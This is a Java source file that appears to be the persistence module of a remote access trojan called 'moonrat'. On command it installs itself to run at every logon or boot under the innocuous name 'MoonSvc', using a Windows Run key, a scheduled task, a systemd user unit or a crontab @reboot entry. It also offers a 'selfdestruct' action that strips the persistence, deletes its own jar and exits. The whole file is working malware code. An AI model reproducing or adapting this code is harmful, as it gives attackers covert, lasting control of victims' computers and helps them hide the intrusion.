package moonrat.client.tasks;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.TimeUnit;
import moonrat.Protocol;
import moonrat.Protocol.Frame;

public final class PersistTasks {
    private static final String NAME = "MoonSvc";
    private static final String UNIT = "moonsvc.service";

    private PersistTasks() {}

    public static Frame handle(String action, String mode) {
        Frame response = new Frame(Protocol.PERSIST_RESP);
        try {
            String output;
            switch (action == null ? "" : action) {
                case "install": output = install(mode); break;
                case "remove": output = remove(); break;
                case "status": output = status(); break;
                case "selfdestruct": output = selfDestruct(); break;
                default: throw new IOException("unknown action '" + action + "'");
            }
            response.fields = new ArrayList<>(List.of("", output));
        } catch (Exception failure) {
            response.fields = new ArrayList<>(List.of(String.valueOf(failure), ""));
        }
        return response;
    }

    private static String install(String mode) throws Exception {
        return isWindows() ? installWindows(mode) : installLinux(mode);
    }

    private static String installWindows(String mode) throws Exception {
        String java = javaBinary();
        String jar = jarPath().toString();
        String value = "\"" + java + "\" -jar \"" + jar + "\"";
        StringBuilder done = new StringBuilder();
        String selected = mode == null || mode.isBlank() || "auto".equals(mode) ? "" : mode;

        if (!"schtasks".equals(selected)) {
            runToEnd(new ProcessBuilder("powershell", "-NoProfile", "-Command",
                    "Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run'"
                            + " -Name '" + NAME + "' -Value '" + value + "' -Force"), 30);
            done.append("run key installed");
        }

        if (!"run".equals(selected)) {
            runToEnd(new ProcessBuilder("powershell", "-NoProfile", "-Command",
                    "$action = New-ScheduledTaskAction -Execute '" + java + "' -Argument '-jar \"" + jar + "\"';"
                            + " $trigger = New-ScheduledTaskTrigger -AtLogOn;"
                            + " Register-ScheduledTask -TaskName '" + NAME + "' -Action $action"
                            + " -Trigger $trigger -Force | Out-Null"), 30);
            if (done.length() > 0) done.append(", ");
            done.append("scheduled task installed");
        }

        return done.toString();
    }

    private static String installLinux(String mode) throws Exception {
        String java = javaBinary();
        String jar = jarPath().toString();
        String command = quote(java) + " -jar " + quote(jar);
        String selected = mode == null || mode.isBlank() || "auto".equals(mode) ? "" : mode;
        boolean systemd = "systemd".equals(selected)
                || (!"cron".equals(selected) && userSystemdAvailable());

        if (systemd) {
            Path unitDir = Paths.get(System.getProperty("user.home"), ".config", "systemd", "user");
            Files.createDirectories(unitDir);
            Files.writeString(unitDir.resolve(UNIT), "[Unit]\n"
                    + "Description=MoonSvc\n"
                    + "\n[Service]\n"
                    + "ExecStart=" + quote(java) + " -jar " + quote(jar) + "\n"
                    + "Restart=always\n"
                    + "\n[Install]\n"
                    + "WantedBy=default.target\n");
            runToEnd(new ProcessBuilder("systemctl", "--user", "daemon-reload"), 15);
            runToEnd(new ProcessBuilder("systemctl", "--user", "enable", "--now", UNIT), 15);
            return "systemd user unit enabled";
        }

        String crontab = readCrontab();
        crontab = dropCronLines(crontab);
        writeCrontab(crontab.isBlank() ? "" : crontab + "\n" + "@reboot " + command + " # " + NAME + "\n");
        return "crontab @reboot installed";
    }

    private static String remove() {
        StringBuilder done = new StringBuilder();
        try {
            if (isWindows()) {
                runQuiet(new ProcessBuilder("powershell", "-NoProfile", "-Command",
                        "Remove-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run'"
                                + " -Name '" + NAME + "' -ErrorAction SilentlyContinue"), 30);
                runQuiet(new ProcessBuilder("powershell", "-NoProfile", "-Command",
                        "Unregister-ScheduledTask -TaskName '" + NAME + "' -Confirm:$false"
                                + " -ErrorAction SilentlyContinue"), 30);
                done.append("windows persistence cleared");
            } else {
                runQuiet(new ProcessBuilder("systemctl", "--user", "disable", "--now", UNIT), 15);
                try {
                    Files.deleteIfExists(Paths.get(System.getProperty("user.home"),
                            ".config", "systemd", "user", UNIT));
                } catch (IOException ignored) {
                }
                runQuiet(new ProcessBuilder("systemctl", "--user", "daemon-reload"), 15);
                String crontab = dropCronLines(readCrontab());
                writeCrontab(crontab);
                done.append("linux persistence cleared");
            }
        } catch (Exception failure) {
            done.append(" (partial: ").append(failure.getMessage()).append(')');
        }
        return done.toString();
    }

    private static String status() {
        try {
            if (isWindows()) {
                String script = "$r='no'; try { $null = Get-ItemProperty"
                        + " -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run'"
                        + " -Name '" + NAME + "' -ErrorAction Stop } catch {}"
                        + " if ($r -eq 'no') { $r = if (Get-ItemProperty"
                        + " -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name '" + NAME
                        + "' -ErrorAction SilentlyContinue) {'yes'} else {'no'} }"
                        + " $t = if (Get-ScheduledTask -TaskName '" + NAME + "' -ErrorAction SilentlyContinue)"
                        + " {'yes'} else {'no'}; \"run_key=$r scheduled_task=$t\"";
                return captureToEnd(new ProcessBuilder("powershell", "-NoProfile", "-Command", script), 30);
            }

            StringBuilder status = new StringBuilder();
            Path unit = Paths.get(System.getProperty("user.home"), ".config", "systemd", "user", UNIT);
            status.append("systemd_unit=").append(Files.isRegularFile(unit) ? "present" : "absent");
            String crontab = readCrontab();
            boolean cron = crontab.lines().anyMatch(line -> line.contains("# " + NAME));
            status.append(" cron=").append(cron ? "present" : "absent");
            return status.toString();
        } catch (Exception failure) {
            return "status failed: " + failure.getMessage();
        }
    }

    private static String selfDestruct() throws Exception {
        String cleanup;
        try {
            cleanup = remove();
        } catch (Exception failure) {
            cleanup = "persistence remove failed: " + failure.getMessage();
        }

        Path jar = jarPath();
        if (isWindows()) {
            spawn(new ProcessBuilder("powershell", "-NoProfile", "-Command",
                    "Start-Sleep -Seconds 2; Remove-Item -Force '" + jar + "' -ErrorAction SilentlyContinue"));
        } else {
            spawn(new ProcessBuilder("sh", "-c", "sleep 2; rm -f '" + jar + "'"));
        }

        Thread killer = new Thread(() -> {
            try {
                Thread.sleep(1200);
            } catch (InterruptedException ignored) {
            }
            System.exit(0);
        }, "moonrat-goodbye");
        killer.setDaemon(false);
        killer.start();

        return cleanup + "; process exits ~1s, jar deleted ~2s";
    }

    private static boolean userSystemdAvailable() {
        try {
            ProcessBuilder builder = new ProcessBuilder("systemctl", "--user", "is-system-running");
            builder.redirectErrorStream(true);
            Process process = builder.start();
            process.getInputStream().readAllBytes();
            process.waitFor(10, TimeUnit.SECONDS);
            return process.exitValue() == 0;
        } catch (Exception failure) {
            return false;
        }
    }

    private static String readCrontab() throws Exception {
        ProcessBuilder builder = new ProcessBuilder("crontab", "-l");
        builder.redirectErrorStream(true);
        Process process = builder.start();
        String output;
        try (InputStream in = process.getInputStream()) {
            output = new String(in.readAllBytes(), StandardCharsets.UTF_8);
        }
        process.waitFor(15, TimeUnit.SECONDS);
        return process.exitValue() == 0 ? output : "";
    }

    private static void writeCrontab(String content) throws Exception {
        ProcessBuilder builder = new ProcessBuilder("crontab", "-");
        Process process = builder.start();
        process.getOutputStream().write(content.getBytes(StandardCharsets.UTF_8));
        process.getOutputStream().close();
        process.waitFor(15, TimeUnit.SECONDS);
        if (process.exitValue() != 0) throw new IOException("crontab write failed");
    }

    private static String dropCronLines(String crontab) {
        StringBuilder kept = new StringBuilder();
        for (String line : crontab.split("\n")) {
            if (line.contains("# " + NAME)) continue;
            kept.append(line).append('\n');
        }
        return kept.toString().stripTrailing();
    }

    private static String javaBinary() throws IOException {
        String command = ProcessHandle.current().info().command().orElse(null);
        if (command == null || command.isBlank()) {
            command = Paths.get(System.getProperty("java.home"), "bin", isWindows() ? "java.exe" : "java").toString();
        }
        Path java = Paths.get(command).toAbsolutePath().normalize();
        if (isWindows()) {
            Path javaw = java.resolveSibling("javaw.exe");
            if (Files.isRegularFile(javaw)) return javaw.toString();
        }
        return java.toString();
    }

    private static Path jarPath() throws IOException {
        try {
            Path path = Paths.get(PersistTasks.class.getProtectionDomain().getCodeSource().getLocation().toURI());
            if (!Files.isRegularFile(path)) throw new IOException("not a jar");
            return path.toAbsolutePath().normalize();
        } catch (Exception failure) {
            throw new IOException("jar path unknown (agent not running from jar)");
        }
    }

    private static String quote(String path) {
        return path.contains(" ") ? "\"" + path + "\"" : path;
    }

    private static void runToEnd(ProcessBuilder builder, int timeoutSeconds) throws Exception {
        builder.redirectErrorStream(true);
        Process process = builder.start();
        String output = consume(process);
        if (!process.waitFor(timeoutSeconds, TimeUnit.SECONDS)) {
            process.destroyForcibly();
            throw new IOException("timeout");
        }
        if (process.exitValue() != 0) {
            throw new IOException(output.isBlank() ? ("exit " + process.exitValue()) : output.trim());
        }
    }

    private static void runQuiet(ProcessBuilder builder, int timeoutSeconds) throws Exception {
        builder.redirectErrorStream(true);
        Process process = builder.start();
        consume(process);
        process.waitFor(timeoutSeconds, TimeUnit.SECONDS);
    }

    private static String captureToEnd(ProcessBuilder builder, int timeoutSeconds) throws Exception {
        builder.redirectErrorStream(true);
        Process process = builder.start();
        String output = consume(process);
        if (!process.waitFor(timeoutSeconds, TimeUnit.SECONDS)) {
            process.destroyForcibly();
            throw new IOException("timeout");
        }
        return output.trim();
    }

    private static String consume(Process process) {
        ByteArrayOutputStream buffer = new ByteArrayOutputStream();
        Thread pump = new Thread(() -> {
            try (InputStream in = process.getInputStream()) {
                in.transferTo(buffer);
            } catch (IOException ignored) {
            }
        });
        pump.setDaemon(true);
        pump.start();
        try {
            pump.join(5000);
        } catch (InterruptedException ignored) {
        }
        return buffer.toString(StandardCharsets.UTF_8);
    }

    private static void spawn(ProcessBuilder builder) {
        builder.redirectOutput(ProcessBuilder.Redirect.DISCARD);
        builder.redirectError(ProcessBuilder.Redirect.DISCARD);
        try {
            builder.start();
        } catch (IOException ignored) {
        }
    }

    private static boolean isWindows() {
        return System.getProperty("os.name").toLowerCase().contains("win");
    }
}
